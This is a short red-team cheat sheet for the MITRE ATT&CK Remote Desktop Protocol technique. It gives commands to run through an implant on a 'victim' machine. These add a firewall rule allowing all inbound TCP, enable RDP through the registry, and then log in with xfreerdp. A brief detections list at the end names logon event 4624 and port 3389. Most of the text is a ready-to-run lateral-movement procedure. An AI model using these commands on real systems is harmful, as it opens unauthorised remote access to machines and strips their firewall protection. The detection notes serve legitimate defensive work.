# [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/)

## Exploit syntax:

1. Run the following command in your posh implant to your victim:
```powershell
sharpps netsh.exe advfirewall firewall add rule name="enablerdp" dir=in action=allow protocol=tcp localport=any enable=yes
```

2. Verify the  firewall rule has been created:
```powershell
sharpps netsh.exe advfirewall firewall show rule status=enabled name=enablerdp 
```

3. Enable RDP on the remote machine
```powershell
sharpps Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
```

4. In a blank terminal, run:
```
sudo xfreerdp /v:<IP ADDRESS>:3389 /u:'<domain>\<user>' /p:'<password>'
```
---

## Detections
* Investigate all remote desktop connections.
* Investigate all event code 4624 ( remote logons )
* Look at connections over port 3389

---

## Resouces